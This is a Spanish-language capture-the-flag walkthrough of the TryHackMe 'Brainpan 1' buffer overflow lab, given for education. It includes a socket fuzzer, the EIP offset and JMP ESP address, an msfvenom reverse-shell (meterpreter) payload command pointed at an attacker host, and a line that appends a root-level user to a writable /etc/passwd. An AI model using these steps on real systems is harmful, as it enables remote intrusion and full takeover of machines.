# Brainpan 1

| **Dificultad** | Hard |
| **Tipo** | Walkthrough |
| **Slug** | `brainpan` |
| **Link** | [TryHackMe](https://tryhackme.com/room/brainpan) |
| **Sección** | 03 Level Hard |
| **Fuente** | thmrevenant (GitHub) |
| **Componentes** | abyss / SimpleHTTPServer / fuzzer / cyclic pattern / mona / msfvenom / meterpreter / /etc/passwd / buffer overflow |
| **Impacto** | Buffer overflow clásico sobre el servicio `abyss` (puerto 9999) con shellcode reverse y escalada a root aprovechando un `/etc/passwd` escritible. |

---

**Contexto:** Brainpan 1 es una sala clásica de buffer overflow (basada en la máquina Brainpan del VulnHub). No se capturan flags: el objetivo se mide por niveles de acceso. Un fuzzer encuentra el offset de EIP, el programa `brainpan.exe` revela la máquina Windows de desarrollo, y una shellcode explota el servicio `abyss` en el puerto 9999 para obtener acceso al sistema Linux y escalar a root.

## Solucionario

### Task 1: No se requiere respuesta

**Explicación:** La sala es un ejercicio guiado en el que el progreso se mide por el nivel de acceso conseguido (no por flags). El recorrido completo es: escaneo (`9999` = servicio `abyss`/Brainpan que pide contraseña, y `10000` = SimpleHTTPServer Python 2.7.3), enumeración web descargando `brainpan.exe` desde `/bin`, fuzzing del puerto 9999 (crash a ~600 bytes, entre 500 y 600), cálculo del offset de EIP con un patrón cíclico (`524` bytes), y control de flujo saltando a `0x311712f3` (`!mona jmp esp` sobre brainpan.exe) con una shellcode generada con msfvenom (badchar `\x00`, con NOP-sled).

```python
# fuzzer: encontrar el crash
import socket
for i in range(100, 1000, 100):
    s = socket.create_connection(("<IP>", 9999))
    s.recv(1024); s.send(b"A" * i); s.close()
# offset de EIP (patrón cíclico) = 524
# shellcode
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=4444 -b "\x00" -f python
```

El exploit final devuelve una sesión como el usuario `puck`. Con la shell hay que comprobar `/etc/passwd`: al ser escritible por el usuario, basta con añadir una línea de un usuario con UID 0 y un hash conocido (p. ej. `openssl passwd -1`), guardarla y hacer `su` para acceder a root.

```text
echo 'hacker:$1$salt$hash:0:0::/root:/bin/bash' >> /etc/passwd
su hacker
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | No answer needed | `No answer needed` |

---

**Metodología:**
1. Escaneo de puertos: `9999` (`abyss`/Brainpan, pide contraseña) y `10000` (SimpleHTTPServer Python 2.7.3).
2. Enumeración web en el puerto 10000 → directorio `/bin` → se descarga `brainpan.exe`.
3. Fuzzing del servicio `9999`: el programa crashea a ~600 bytes; el desbordamiento ocurre entre 500 y 600 bytes.
4. Con un patrón cíclico se calcula el offset de EIP = `524` bytes.
5. Con `mona`/`!mona jmp esp` se obtiene la dirección `0x311712f3` (brainpan.exe) para el control de flujo.
6. Se usa `msfvenom` para generar shellcode de reverse shell (sin el badcharacter `\x00`) y se añade un NOP-sled.
7. Se envía el exploit con la shellcode `windows/meterpreter/reverse_tcp` → conexión como usuario `puck`.
8. Escalada de privilegios: `/etc/passwd` es escritible → se añade un usuario root con hash conocido → `su` → acceso root.

**Learning chain:** `nmap → 9999 (abyss) y 10000 (SimpleHTTPServer) → /bin → brainpan.exe → fuzzer (crash a 600 bytes) → offset de EIP (524) → JMP ESP (0x311712f3) → shellcode → reverse shell como puck → /etc/passwd escritible → root`

**MITRE ATT&CK:** T1210 (Exploitation of Remote Services), T1068 (Exploitation for Privilege Escalation)

**Fuente:** [TryHackMe - Brainpan 1](https://tryhackme.com/room/brainpan)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.
